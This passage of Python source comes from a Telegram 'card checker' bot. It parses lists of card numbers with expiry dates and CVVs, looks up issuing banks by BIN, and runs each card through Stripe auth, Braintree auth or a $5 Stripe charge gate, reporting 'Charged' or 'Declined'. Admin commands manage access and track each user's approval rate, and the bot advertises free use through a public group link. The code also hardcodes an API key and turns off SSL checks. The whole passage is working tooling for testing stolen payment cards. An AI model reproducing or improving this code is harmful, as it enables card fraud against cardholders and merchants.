        header = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if is_approved else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        status_text = "Approved 💎" if is_approved else "Declined ❌"
        
        result_msg = (
            f"{header}\n"
            f"━━━━━━━━━━━━━\n"
            f"[⟐] 𝗖𝗖 - `{cc}|{mon}|{year}|{cvv}`\n"
            f"[⟐] 𝗦𝘁𝗮𝘁𝐮𝘀 : {status_text if is_approved else error_msg}\n"
            f"━━━━━━━━━━━━━\n"
        )
        
        if bin_data:
            scheme = bin_data.get('brand', 'UNKNOWN')
            type_ = bin_data.get('type', 'UNKNOWN')
            issuer = bin_data.get('issuer', 'UNKNOWN')
            country = bin_data.get('country', 'Unknown')
            
            result_msg += (
                f"🔢 BIN: `{cc[:6]}`\n"
                f"🏦 Bank: {issuer}\n"
                f"🌍 Country: {country} 🌍\n"
                f"💰 Type: {type_}\n"
                f"🔵 Brand: {scheme}\n"
                f"━━━━━━━━━━━━━\n"
            )
        else:
            result_msg += f"🔢 BIN: `{cc[:6]}` (Lookup Failed)\n━━━━━━━━━━━━━\n"

        result_msg += f"[⟐] T/t : {time_taken:.1f}s"
        return result_msg, is_approved

    except Exception as e:
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n━━━━━━━━━━━━━\n[⟐] 𝗖𝗖 - `{cc}|{mon}|{year}|{cvv}`\n[⟐] 𝗦𝘁𝗮𝘁𝐮𝘀 : Declined ❌\n[⟐] Error : System Error ({str(e)})\n━━━━━━━━━━━━━\n[⟐] T/t : {time.time() - start_time:.1f}s", False

def extract_card_from_text(text):
    """Extract card data from plain text input."""
    import re
    
    # Simple pattern for basic card format: NNNN|MM|YY|CVV
    card_pattern = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    
    match = re.search(card_pattern, text)
    if match:
        cc, mm, yy, cvv = match.groups()
        
        # Clean and format
        cc = cc.replace(' ', '')
        
        # Ensure year is 2 digits
        if len(yy) == 4:
            yy = yy[-2:]
        
        # Ensure month is 2 digits
        if len(mm) == 1:
            mm = '0' + mm
            
        return f"{cc}|{mm}|{yy}|{cvv}"
    
    return None

def extract_multiple_cards_from_text(text):
    """Extract multiple cards from plain text input with flexible separators."""
    import re
    # Match various formats like CC|MM|YY|CVV or CC MM YY CVV or CC/MM/YY/CVV
    card_pattern = r'(\d{13,19})[^\d](\d{1,2})[^\d](\d{2,4})[^\d](\d{3,4})'
    matches = re.findall(card_pattern, text)
    
    cards = []
    for match in matches:
        cc, mm, yy, cvv = match
        # Ensure year is 2 digits
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 1:
            yy = '0' + yy
            
        # Ensure month is 2 digits
        if len(mm) == 1:
            mm = '0' + mm
            
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    
    return cards if cards else None

HANDY_API_KEY = "HAS-0YEnXQKHN3qk0c4536yBdx"  # HandyAPI Secret Key (Backend)

# ... (Admin system configuration remains unchanged) ...

async def bin_lookup(bin_number):
    """Lookup BIN information using HandyAPI."""
    try:
        # Use first 6 digits for BIN lookup
        bin_clean = bin_number[:6]
        
        url = f"https://data.handyapi.com/bin/{bin_clean}"
        headers = {
            'x-api-key': HANDY_API_KEY
        }

        # Create a specific SSL context for this API if needed, or use default
        # Using a fresh connector for simplicity and reliability here
        connector = aiohttp.TCPConnector(
            limit=10,
            limit_per_host=5,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=False  # HandyAPI might handle SSL differently or leniently, usually ok.
                       # If production requires strict SSL, we'd remove ssl=False or configure it.
                       # Given the existing code has ssl=False or custom context everywhere, sticking to lenient.
        )
        
        timeout = aiohttp.ClientTimeout(total=60, connect=30)
        
        async with aiohttp.ClientSession(
            connector=connector, 
            timeout=timeout,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'}
        ) as session:
            async with session.get(url, headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    
                    # Transform HandyAPI response to our internal format
                    # HandyAPI Structure:
                    # {
                    #   "Status": "SUCCESS",
                    #   "Scheme": "MASTERCARD",
                    #   "Type": "CREDIT",
                    #   "Issuer": "COMMONWEALTH BANK OF AUSTRALIA",
                    #   "CardTier": "PLATINUM MASTERCARD",
                    #   "Country": { "A2": "AU", "Name": "Australia", ... },
                    #   "Luhn": true
                    # }
                    
                    if data.get("Status") == "SUCCESS":
                        country_data = data.get("Country", {})
                        
                        return {
                            "is_valid": True,
                            "brand": data.get("Scheme"),
                            "type": data.get("Type"),
                            "issuer": data.get("Issuer"),
                            "country_iso2": country_data.get("A2"),
                            "country": country_data.get("Name"),
                            # Optional extra fields if needed later
                            "tier": data.get("CardTier"),
                            "luhn": data.get("Luhn")
                        }
                        
                    return None
                else:
                    print(f"HandyAPI lookup failed with status: {response.status}")
    except Exception as e:
        print(f"HandyAPI lookup error: {e}")
            
    return None

async def sb_check_card(cc_data, card_num, total_cards, user_id, session_id=None):
    """Check card using the charged card API (/sb)."""
    # Helper to check if still active
    def is_active():
        if session_id is None: return True
        return session_id in checking_sessions and checking_sessions[session_id]['active'] and session_id not in paused_sessions

    try:
        if not is_active(): return None, False
        # Regex to extract CC details
        import re
        match = re.search(r'(\d{13,19})[^\d](\d{1,2})[^\d](\d{2,4})[^\d](\d{3,4})', cc_data)
        if not match:
            return f"❌ [{card_num}/{total_cards}] Invalid Format: `{cc_data}`", False
            
        cc, mon, year, cvv = match.groups()
        year = year[-2:] if len(year) > 2 else year
        
        # Validation
        if not (13 <= len(cc) <= 19) or not (3 <= len(cvv) <= 4) or not (1 <= int(mon) <= 12):
            return f"❌ [{card_num}/{total_cards}] Invalid Data: `{cc_data}`", False
            
        # Block Amex
        if cc.startswith(('34', '37')):
            return f"⚠️ [{card_num}/{total_cards}] Amex Blocked: `34/37`", False

        # Brand Detection
        brand = "UNKNOWN"
        if cc.startswith('4'): brand = "VISA"
        elif cc.startswith(('51', '52', '53', '54', '55')): brand = "MASTERCARD"
        elif cc.startswith('6'): brand = "DISCOVER"

        # Lookup BIN
        bin_data = await bin_lookup(cc[:6])
        country = bin_data.get('country', 'UNKNOWN') if bin_data else 'UNKNOWN'
        issuer = bin_data.get('issuer', 'UNKNOWN') if bin_data else 'UNKNOWN'
        c_type = bin_data.get('type', 'UNKNOWN') if bin_data else 'UNKNOWN'
        tier = bin_data.get('tier', 'UNKNOWN') if bin_data else 'UNKNOWN'

        start_time = time.time()
        
        # Convert YY to YYYY for API
        full_year = f"20{year}" if len(year) == 2 else year
        
        # API Call - Format: number|month|year|cvv
        payload = {
            "card": f"{cc}|{mon}|{full_year}|{cvv}"
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post(SB_API_URL, json=payload, timeout=120) as response:
                res = await response.json()
                status = res.get('status', 'error').lower()
                message = res.get('message', 'No message')
                
                time_taken = round(time.time() - start_time, 1)
                
                # Logic for approval - Only Charged or Declined
                is_approved = False
                emoji = "❌"
                stat_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
                
                # Only mark as approved if actually charged
                if status == 'charged' or 'charged successfully' in message.lower():
                    is_approved = True
                    emoji = "✅"
                    stat_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
                # Everything else is declined
                else:
                    is_approved = False
                    emoji = "❌"
                    stat_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"

                result = (
                    f"{stat_text} {emoji} [{card_num}/{total_cards}]\n"
                    f"━━━━━━━━━━━━━\n"
                    f"[⟐] 𝗖𝗖 - `{cc}|{mon}|{year}|{cvv}`\n"
                    f"[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {message}\n"
                    f"[⟐] 𝗚𝗮𝘁𝗲 - Stripe Charge 💰\n"
                    f"[⟐] 𝗔𝗺𝗼𝘂𝗻𝘁 - $5.00 💳\n"
                    f"━━━━━━━━━━━━━\n"
                    f"[⟐] 𝗕𝗶𝗻 : `{cc[:6]}`\n"
                    f"[⟐] 𝗖𝐨𝐮𝐧𝘁𝗿𝐲 : {country}\n"
                    f"[⟐] 𝗜𝘀𝘀𝐮𝗲𝗿 : {issuer}\n"
                    f"[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {c_type} | {tier}\n"
                    f"━━━━━━━━━━━━━\n"
                    f"[⟐] T/t : {time_taken}s"
                )
                return result, is_approved
    except Exception as e:
        return f"❌ [{card_num}/{total_cards}] System Error: {str(e)}", False

def luhn_checksum(card_num):
    """Calculate Luhn checksum for credit card validation."""
    def digits_of(n):
        return [int(d) for d in str(n)]

    
    digits = digits_of(card_num)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10





def format_bin_info(bin_data, bin_number):
    """Format BIN information for display."""
    if not bin_data:
        return f"❌ BIN lookup failed: `{bin_number}`\n\nPlease try again or check if the BIN is valid."
    
    # Check if BIN is valid
    if not bin_data.get('is_valid', False):
        return f"❌ Invalid BIN: `{bin_number}`\n\nThis BIN is not valid according to the database."
    
    # Get country flag emoji
    country_flags = {
        'US': '🇺🇸', 'CA': '🇨🇦', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹',
        'ES': '🇪🇸', 'NL': '🇳🇱', 'BE': '🇧🇪', 'CH': '🇨🇭', 'AT': '🇦🇹', 'SE': '🇸🇪',
        'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿', 'HU': '🇭🇺',
        'RU': '🇷🇺', 'UA': '🇺🇦', 'TR': '🇹🇷', 'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪',
        'IN': '🇮🇳', 'CN': '🇨🇳', 'JP': '🇯🇵', 'KR': '🇰🇷', 'AU': '🇦🇺', 'NZ': '🇳🇿',
        'BR': '🇧🇷', 'MX': '🇲🇽', 'AR': '🇦🇷', 'CL': '🇨🇱', 'CO': '🇨🇴', 'PE': '🇵🇪',
        'CR': '🇨🇷', 'PA': '🇵🇦', 'GT': '🇬🇹', 'HN': '🇭🇳', 'SV': '🇸🇻', 'NI': '🇳🇮',
        'TH': '🇹🇭', 'VN': '🇻🇳', 'MY': '🇲🇾', 'SG': '🇸🇬', 'PH': '🇵🇭', 'ID': '🇮🇩'
    }
    
    # Get country code and flag
    country_code = bin_data.get('country_iso2', '').upper()
    flag = country_flags.get(country_code, '🌍')
    
    # Format the response
    result = f"💳 BIN Information\n"
    result += f"━━━━━━━━━━━━━━━━━━\n"
    result += f"🔢 BIN: `{bin_number}`\n"
    
    # Handle premium fields
    issuer = bin_data.get('issuer', '')
    if issuer and 'premium subscribers only' not in issuer.lower():
        result += f"🏦 Bank: {issuer}\n"
    
    if bin_data.get('country'):
        result += f"🌍 Country: {bin_data['country']} {flag}\n"
    
    card_type = bin_data.get('type', '')
    if card_type and 'premium subscribers only' not in card_type.lower():
        type_emoji = '💎' if 'CREDIT' in card_type.upper() else '💰'
        result += f"{type_emoji} Type: {card_type.upper()}\n"
    
    brand = bin_data.get('brand', '')
    if brand and 'premium subscribers only' not in brand.lower():
        brand_upper = brand.upper()
        brand_emoji = '🔵' if brand_upper == 'VISA' else '🔴' if brand_upper == 'MASTERCARD' else '🟢'
        result += f"{brand_emoji} Brand: {brand_upper}\n"
    
    # Show premium notice if needed
    premium_fields = []
    for field, value in [('Brand', brand), ('Type', card_type), ('Bank', issuer)]:
        if value and 'premium subscribers only' in value.lower():
            premium_fields.append(field)
    
    if premium_fields:
        result += f"🔒 Premium Info: {', '.join(premium_fields)} (Upgrade needed)\n"
    
    result += f"━━━━━━━━━━━━━━━━━━"
    
    return result

def is_authorized(user_id, chat_id=None):
    """Check if user/group is authorized.
    
    Logic:
    1. If DM (chat_id == user_id): Must be in authorized_users OR Admin.
    2. If Group: Must be in private_groups OR public_groups.
    """
    if is_admin(user_id):
        return True
        
    # If checking for a specific group context
    if chat_id and str(chat_id) != str(user_id):
        chat_id_str = str(chat_id)
        # Check if group is authorized (Public or Private)
        if chat_id_str in group_auth.get('private_groups', {}) or chat_id_str in group_auth.get('public_groups', {}):
            return True
        return False
        
    # DM Context - Strict authorization
    if not is_authorization_enabled():
        return True  # Allow all only if global auth is disabled (fallback)
        
    return user_id in authorized_users

def is_admin(user_id):
    """Check if user is the main admin."""
    return user_id == ADMIN_ID

def is_user_authorized(user_id):
    """Check if user is authorized to use the bot."""
    return user_id in authorized_users or is_admin(user_id)

def is_authorized(user_id):
    """Alias for is_user_authorized for backward compatibility."""
    return is_user_authorized(user_id)

async def send_message_with_retry(update_or_query, context, chat_id, text, reply_markup=None, parse_mode='Markdown', max_retries=5):
    """Send message with retry logic to handle rate limits and network issues."""
    for attempt in range(max_retries):
        try:
            if hasattr(update_or_query, 'edit_message_text'):
                # It's a CallbackQuery
                return await update_or_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            else:
                # It's an Update with message
                return await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            print(f"Message send attempt {attempt + 1} failed: {e}")
            if attempt == max_retries - 1:
                print(f"Failed to send message after {max_retries} attempts: {e}")
                return None
            await asyncio.sleep(min(2 ** attempt, 10))  # Exponential backoff with max 10s delay

# Bot handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    user_id = update.effective_user.id
    user = update.effective_user
    
    # Username Check - Block users without username
    if not user.username:
        await update.message.reply_text(
            "❌ **ACCESS DENIED** ❌\n\n"
            "You must have a **Telegram Username** to use this bot.\n"
            "Please set a username in your Telegram settings and try again.",
            parse_mode='Markdown'
        )
        return
    
    # Track user activity
    stats = get_user_stats(user_id)
    is_new = stats.get('is_new_user', False)
    
    # Group Punishment Check
    chat_id = update.effective_chat.id
    if str(chat_id).startswith('-'):
        punished, reason = is_group_punished(chat_id)
        if punished:
            await update.message.reply_text(reason, parse_mode='Markdown')
            return
        # Track group activity
        update_group_activity(chat_id, title=update.effective_chat.title)

    # Update user info
    update_user_activity(
        user_id, 
        username=user.username,
        first_name=user.first_name,
        last_name=user.last_name
    )
    increment_feature_usage(user_id, 'start', chat_id=chat_id)
    
    # Maintenance Check
    print(f"DEBUG: Maintenance check for user {user_id}. Mode: {is_maintenance_mode()}, Admin: {is_admin(user_id)}")
    if is_maintenance_mode() and not is_admin(user_id):
        await update.message.reply_text(
            "🚧 **BOT UNDER MAINTENANCE** 🚧\n\n"
            "Sorry! The bot is temporarily down for maintenance. Please try again later.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👨‍💻 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown'
        )
        return

    # Punishment Check
    punished, reason = is_user_punished(user_id)
    if punished:
        await update.message.reply_text(reason, parse_mode='Markdown')
        return

    # Notify admin about new user
    if is_new:
        stats['is_new_user'] = False
        save_user_tracking()
        await notify_admin_new_user(context, user)
    
    if not is_authorized(user_id):
        await update.message.reply_text(
            "🚫 **ACCESS DENIED** 🚫\n\n"
            "❌ You are not authorized to use this bot privately.\n"
            "🔒 This is a private card checker system.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🆓 **WANT FREE ACCESS?**\n"
            "Join our public group to use the bot for FREE:\n"
            "👉 https://t.me/+NH584KZpRndkYmY1\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 Your ID: `{user_id}`\n"
            f"📞 Contact Admin: {ADMIN_USERNAME}",
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        return

    admin_status = "👑 ADMIN" if is_admin(user_id) else "✅ AUTHORIZED USER"
    
    # Simplified limits
    if is_admin(user_id):
        limits_text = "📊 **Limits:** ♾️ Unlimited"
    else:
        limits_text = "📊 **Limits:** File: 500 | Multi: 100"
    
    active_slots = get_active_slot_count()
    
    welcome_text = f"""🔥💳 **CARD CHECKER BOT** 💳🔥

{admin_status}
{limits_text}

📁 **File Upload:** `.txt` with `CC|MM|YY|CVV`
🔍 **BIN Lookup:** `/bin 434527`

📝 **Commands:**
/start - This message
/help - Help & limits
/bin - BIN lookup
/au - Stripe Auth 💎
/ba - Braintree Auth 🔐
/sb - Stripe Charge ($5) ⚡
/pause /resume /stop - Control

✨ Use /au, /ba or /sb to check cards!"""

    if is_admin(user_id):
        welcome_text += "\n\n👑 /admin - Admin Panel"

    
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def adduser_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /adduser command - Admin only."""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/adduser <user_id>`\n\n"
            "Example: `/adduser 123456789`",
            parse_mode='Markdown'
        )
        return
    
    try:
        new_user_id = int(context.args[0])
        if new_user_id in authorized_users:
            await update.message.reply_text(f"⚠️ User `{new_user_id}` is already authorized!", parse_mode='Markdown')
        else:
            authorized_users.add(new_user_id)
            save_authorized_users()
            await update.message.reply_text(
                f"✅ **USER AUTHORIZED**\n\n"
                f"User `{new_user_id}` has been added to authorized users.\n"
                f"They can now use the bot in Private Mode.",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ Invalid ID format! Use numeric ID.")

async def addgroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /addgroup command - Admin only. Adds a PUBLIC group."""
    user_id = update.effective_user.id
    if not is_admin(user_id): return

    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: `/addgroup <group_id> [allow_sb: true/false]`")
        return
        
    group_id = context.args[0]
    allow_sb = False
    if len(context.args) > 1:
        allow_sb = context.args[1].lower() == 'true'
        
    # Remove from private if exists
    if group_id in group_auth.get('private_groups', {}):
        del group_auth['private_groups'][group_id]
        
    group_auth.setdefault('public_groups', {})[group_id] = {
        "sb_allowed": allow_sb,
        "added_on": get_ist_time().isoformat()
    }
    save_group_auth()
    
    await update.message.reply_text(
        f"✅ **PUBLIC GROUP ADDED**\n\n"
        f"ID: `{group_id}`\n"
        f"Gateway: Public Cookies 🍪\n"
        f"/sb Access: {'✅ Allowed' if allow_sb else '❌ Denied'}",
        parse_mode='Markdown'
    )

async def addprivategroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /addprivategroup command - Admin only. Adds a PRIVATE group."""
    user_id = update.effective_user.id
    if not is_admin(user_id): return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/addprivategroup <group_id>`")
        return
        
    group_id = context.args[0]
    
    # Remove from public if exists
    if group_id in group_auth.get('public_groups', {}):
        del group_auth['public_groups'][group_id]
        
    group_auth.setdefault('private_groups', {})[group_id] = {
        "added_on": get_ist_time().isoformat()
    }
    save_group_auth()
    
    await update.message.reply_text(
        f"✅ **PRIVATE GROUP ADDED**\n\n"
        f"ID: `{group_id}`\n"
        f"Gateway: Private Cookies 🍪\n"
        f"Access: Full Premium",
        parse_mode='Markdown'
    )

async def removegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /removegroup command - Admin only. Removes a group from auth list."""
    user_id = update.effective_user.id
    if not is_admin(user_id): return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/removegroup <group_id>`\n\n"
            "Example: `/removegroup -1001234567890`",
            parse_mode='Markdown'
        )
        return
        
    group_id = context.args[0]
    removed = False
    
    if group_id in group_auth.get('public_groups', {}):
        del group_auth['public_groups'][group_id]
        removed = True
        group_type = "PUBLIC"
        
    if group_id in group_auth.get('private_groups', {}):
        del group_auth['private_groups'][group_id]
        removed = True
        group_type = "PRIVATE"
    
    if removed:
        save_group_auth()
        await update.message.reply_text(
            f"✅ **{group_type} GROUP REMOVED**\n\n"
            f"ID: `{group_id}`\n"
            f"Bot will no longer work in this group.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ Group `{group_id}` not found in authorized groups!",
            parse_mode='Markdown'
        )

async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /removeuser command - Admin only."""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/removeuser <user_id>`\n\n"
            "Example: `/removeuser 123456789`",
            parse_mode='Markdown'
        )
        return
    
    try:
        remove_user_id = int(context.args[0])
        if remove_user_id == ADMIN_ID:
            await update.message.reply_text("🚫 Cannot remove admin!")
            return
        
        if remove_user_id in authorized_users:
            authorized_users.remove(remove_user_id)
            save_authorized_users()  # Save to file
            await update.message.reply_text(
                f"✅ User Removed Successfully!\n\n"
                f"👤 User ID: `{remove_user_id}`\n"
                f"🎯 Total Users: {len(authorized_users)}",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(f"⚠️ User `{remove_user_id}` was not authorized!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Please provide a valid number.")

async def listusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /listusers command - Admin only."""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only command!")
        return
    
    users_list = "👑 AUTHORIZED USERS LIST\n\n"
    for i, uid in enumerate(sorted(authorized_users), 1):
        status = "👑 ADMIN" if uid == ADMIN_ID else "✅ USER"
        users_list += f"{i}. `{uid}` - {status}\n"
    
    users_list += f"\n🎯 Total Users: {len(authorized_users)}"
    
    await update.message.reply_text(users_list, parse_mode='Markdown')

async def allusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /allusers command - Admin only. Show all users with their stats."""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only command!")
        return
    
    if not user_tracking:
        await update.message.reply_text("📭 No users tracked yet!")
        return
    
    # Build users list with stats
    msg = "📊 ALL USERS STATS 📊\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for i, (uid, stats) in enumerate(user_tracking.items(), 1):
        username = stats.get('username') or 'N/A'
        first_name = stats.get('first_name') or 'Unknown'
        last_active = stats.get('last_active', 'Never')
        time_ago = get_time_ago(last_active)
        online_status = "🟢 ONLINE" if is_user_online(last_active) else "🔴 OFFLINE"
        
        cards_checked = stats.get('total_cards_checked', 0)
        cards_approved = stats.get('cards_approved', 0)
        cards_declined = stats.get('cards_declined', 0)
        
        msg += f"{i}. 👤 {first_name} (@{username})\n"
        msg += f"   ID: `{uid}` | {online_status}\n"
        msg += f"   📊 Cards: {cards_checked} | ✅ {cards_approved} | ❌ {cards_declined}\n"
        msg += f"   ⏰ Last Active: {time_ago}\n"
        msg += "   ─────────────────\n"
        
        # Telegram has message limits, split if too long
        if len(msg) > 3500:
            await update.message.reply_text(msg, parse_mode='Markdown')
            msg = ""
    
    if msg:
        msg += f"\n📈 Total Tracked Users: {len(user_tracking)}"
        await update.message.reply_text(msg, parse_mode='Markdown')

async def allgroups_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all groups tracked - Admin only."""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only command!")
        return

    if not group_tracking:
        await update.message.reply_text("📭 No groups tracked yet.")
        return

    msg = "📊 **ALL TRACKED GROUPS** 📊\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for i, (gid, stats) in enumerate(group_tracking.items(), 1):
        title = stats.get('title', 'Unknown Group')
        members = stats.get('members_count', 'N/A')
        cards = stats.get('total_cards_checked', 0)
        status = "🔴 BANNED" if stats.get('banned') else "🟢 ACTIVE"
        
        msg += f"{i}. 🏰 {title}\n"
        msg += f"   ID: `{gid}` | {status}\n"
        msg += f"   📊 Cards: {cards} | 👥 Members: {members}\n"
        msg += "   ─────────────────\n"
        
        if len(msg) > 3500:
            await update.message.reply_text(msg, parse_mode='Markdown')
            msg = ""

    if msg:
        msg += f"\n🏰 Total Tracked Groups: {len(group_tracking)}"
        await update.message.reply_text(msg, parse_mode='Markdown')

async def groupstats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show detailed stats for a group - Admin only."""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only command!")
        return

    if not context.args:
        await update.message.reply_text("❌ Usage: `/groupstats <group_id>`")
        return

    target_id = context.args[0]
    if target_id not in group_tracking:
        await update.message.reply_text(f"❌ Group `{target_id}` not found in database!")
        return

    stats = group_tracking[target_id]
    
    banned = stats.get('banned', False)
    suspended_until = stats.get('suspended_until')
    status_text = "🔴 BANNED" if banned else "⏳ SUSPENDED" if suspended_until else "🟢 ACTIVE"
    
    msg = f"🏰 **GROUP DETAILED STATS** 🏰\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    msg += f"📋 **Basic Info:**\n"
    msg += f"   • Name: {stats.get('title', 'Unknown')}\n"
    msg += f"   • ID: `{target_id}`\n"
    msg += f"   • Status: {status_text}\n"
    msg += f"   • Members: {stats.get('members_count', 'N/A')}\n"
    msg += f"   • Link: {stats.get('link', 'N/A')}\n\n"
    
    msg += f"⏰ **Activity:**\n"
    msg += f"   • Joined: {stats.get('join_time', 'Unknown')}\n"
    msg += f"   • Last Active: {get_time_ago(stats.get('last_active', ''))}\n\n"
    
    msg += f"💳 **Card Statistics:**\n"
    msg += f"   • Total Checked: {stats.get('total_cards_checked', 0)}\n"
    
    if suspended_until:
        msg += f"\n⏳ **Suspended Until:** `{suspended_until}`\n"
    
    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def userstats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /userstats <user_id> command - Admin only. Show detailed user stats."""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("🚫 ACCESS DENIED - Admin only command!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/userstats <user_id>`\n\n"
            "Example: `/userstats 123456789`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target_user_id = context.args[0]
        
        if target_user_id not in user_tracking:
            await update.message.reply_text(f"❌ User `{target_user_id}` not found in tracking data!", parse_mode='Markdown')
            return
        
        stats = user_tracking[target_user_id]
        
        # User basic info
        username = stats.get('username') or 'N/A'
        first_name = stats.get('first_name') or 'Unknown'
        last_name = stats.get('last_name') or ''
        full_name = f"{first_name} {last_name}".strip()
        
        # Activity info
        join_time = stats.get('join_time', 'Unknown')
        last_active = stats.get('last_active', 'Never')
        time_ago = get_time_ago(last_active)
        online_status = "🟢 ONLINE" if is_user_online(last_active) else "🔴 OFFLINE"
        
        # Card stats
        cards_checked = stats.get('total_cards_checked', 0)
        cards_approved = stats.get('cards_approved', 0)
        cards_declined = stats.get('cards_declined', 0)
        success_rate = (cards_approved / cards_checked * 100) if cards_checked > 0 else 0
        
        # Feature usage
        features = stats.get('features_used', {})
        
        msg = f"👤 USER DETAILED STATS 👤\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        msg += f"📋 **Basic Info:**\n"
        msg += f"   • User ID: `{target_user_id}`\n"
        msg += f"   • Name: {full_name}\n"
        msg += f"   • Username: @{username}\n"
        msg += f"   • Status: {online_status}\n\n"
        
        msg += f"⏰ **Activity:**\n"
        msg += f"   • Joined: {join_time[:10] if len(join_time) > 10 else join_time}\n"
        msg += f"   • Last Active: {time_ago}\n"
        msg += f"   • Sessions: {stats.get('sessions_count', 0)}\n\n"
        
        msg += f"💳 **Card Statistics:**\n"
        msg += f"   • Total Checked: {cards_checked}\n"
        msg += f"   • ✅ Approved: {cards_approved}\n"
        msg += f"   • ❌ Declined: {cards_declined}\n"
        msg += f"   • 📈 Success Rate: {success_rate:.1f}%\n\n"
        
        # Add /sb stats
        sb_checked = stats.get('sb_cards_checked', 0)
        sb_approved = stats.get('sb_cards_approved', 0)
        sb_declined = stats.get('sb_cards_declined', 0)
        sb_rate = (sb_approved / sb_checked * 100) if sb_checked > 0 else 0
        
        msg += f"⚡ **Stripe Charge Gate (/sb):**\n"
        msg += f"   • Total Checked: {sb_checked}\n"
        msg += f"   • ✅ Approved: {sb_approved}\n"
        msg += f"   • ❌ Declined: {sb_declined}\n"
        msg += f"   • 📈 Success Rate: {sb_rate:.1f}%\n\n"
        
        msg += f"🔧 **Features Used:**\n"
        msg += f"   • /start: {features.get('start', 0)} times\n"
        msg += f"   • /help: {features.get('help', 0)} times\n"
        msg += f"   • /sb command: {features.get('stripe_charge_sb', 0)} times\n"
        msg += f"   • BIN Lookup: {features.get('bin_lookup', 0)} times\n"
        msg += f"   • Single Card Check: {features.get('single_card_check', 0)} times\n"
        msg += f"   • Multi Card Check: {features.get('multi_card_check', 0)} times\n"
        msg += f"   • File Upload: {features.get('file_upload', 0)} times\n"
        msg += f"   • Pause: {features.get('pause', 0)} times\n"
        msg += f"   • Resume: {features.get('resume', 0)} times\n"
        msg += f"   • Stop: {features.get('stop', 0)} times\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        
        await update.message.reply_text(msg, parse_mode='Markdown')
        
    except Exception as e:
